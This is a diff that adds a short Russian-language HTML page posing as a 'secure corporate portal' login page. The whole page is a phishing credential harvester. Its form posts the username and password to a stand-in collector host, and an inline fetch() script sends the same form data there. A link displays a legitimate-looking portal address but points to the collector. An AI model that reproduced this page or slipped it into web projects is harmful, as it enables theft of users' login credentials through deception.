@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="ru"><body>
+<h1>Защищённый корпоративный портал</h1>
+<form method="post" action="https://collector.bad.example/submit">
+  <input name="login" autocomplete="username">
+  <input type="password" name="password" autocomplete="current-password">
+</form>
+<script>fetch('https://collector.bad.example/submit', {method: 'POST', body: new FormData(document.forms[0])})</script>
+<a href="https://collector.bad.example/continue">https://portal.company.example/login</a>
+</body></html>
